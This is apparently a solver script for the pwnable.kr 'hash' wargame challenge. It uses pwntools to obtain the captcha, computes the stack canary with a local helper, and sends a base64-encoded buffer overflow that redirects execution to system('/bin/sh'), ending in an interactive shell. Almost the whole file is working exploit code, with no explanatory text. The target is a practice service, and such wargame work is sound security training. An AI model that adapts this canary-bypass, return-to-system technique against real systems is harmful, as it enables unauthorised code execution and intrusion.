from pwn import *
from base64 import *
from requests import *
import os
import sys 
import time 

print time.localtime()
print time.gmtime()

r = get('http://143.248.249.64')
print r.headers['date']

if sys.argv[1] == 'r':
	p = remote('pwnable.kr', 9002)
elif sys.argv[1] == 'l':
	p = process('./hash')
elif sys.argv[1] == 's':
	p = remote('localhost', 8888)
else:
	exit(0)
print p.recvuntil('captcha :')
captcha = int(p.recvuntil('\n'))
print 'captcha:',captcha
cookie = os.popen('./calc ' + str(captcha) ).read()
print 'cookie: ',cookie
p.sendline(str(captcha))

main = 0x804908F
system = 0x08048880
sh = 0x804b3b4
payload = ''
payload = payload.ljust(0x200, 'a')
payload += p32( int(cookie, 16) )
payload += 'a'*0x8
payload += 'a'*0x4
payload += p32( system )
payload += p32( sh )
payload += p32( sh )
payload += p32( sh )
payload += p32( sh )
payload = b64encode( payload )
payload = list( payload )
l = len(payload)
payload[l - 8] = '/'
payload[l - 7] = 'b'
payload[l - 6] = 'i'
payload[l - 5] = 'n'
payload[l - 4] = '/'
payload[l - 3] = 's'
payload[l - 2] = 'h'
payload[l - 1] = '\x00'
payload = ''.join( i for i in payload )
print p.recvuntil('me!')
p.sendline( payload )


p.interactive()
